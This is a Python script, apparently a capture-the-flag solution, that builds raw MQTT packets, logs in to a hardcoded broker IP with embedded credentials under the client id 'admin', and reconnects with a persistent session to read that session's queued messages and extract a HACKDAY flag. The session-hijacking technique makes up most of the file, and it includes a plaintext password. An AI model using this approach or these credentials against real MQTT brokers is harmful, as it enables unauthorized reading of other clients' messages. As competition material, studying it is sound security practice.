import socket
import struct
import time

def mqtt_connect(client_id, username=None, password=None, clean_session=False):
    # Fixed Header: 0x10, remaining length
    flags = 0x00
    if clean_session: flags |= 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username: payload += struct.pack("!H", len(username)) + username.encode()
    if password: payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    return b'\x10' + struct.pack("B", rem_len) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x01' # QoS 1
    rem_len = len(var_header) + len(payload)
    return b'\x82' + struct.pack("B", rem_len) + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    cid = "admin"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect(cid, user, pwd, clean_session=False))
    connack = s.recv(4)
    print(f"[*] Connack: {connack.hex()}")
    
    # Subscribing might trigger more messages?
    # But usually stored messages are for ALREADY SUBSCRIBED topics in that session.
    # If the session is old, it might already have subscriptions.
    
    print("[*] Waiting for incoming messages in existing session...")
    start_time = time.time()
    try:
        while time.time() - start_time < 30:
            data = s.recv(16384)
            if not data: break
            decoded = data.decode(errors='ignore')
            print(f"[*] Received {len(data)} bytes")
            if "HACKDAY{" in decoded:
                print(f"[!!!] FLAG: {decoded[decoded.find('HACKDAY{'):decoded.find('HACKDAY{')+100]}")
                break
            # Also print topics
            try:
                i = 0
                while i < len(data):
                    if data[i] & 0xF0 == 0x30:
                        rl = data[i+1]; offset = 2
                        t_len = struct.unpack("!H", data[i+offset:i+offset+2])[0]
                        topic = data[i+offset+2:i+offset+2+t_len].decode(errors='ignore')
                        payload = data[i+offset+2+t_len:i+offset+rl].decode(errors='ignore')
                        print(f"  [T] {topic}: {payload[:100]}")
                        i += offset + rl
                    else: i += 1
            except: pass
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
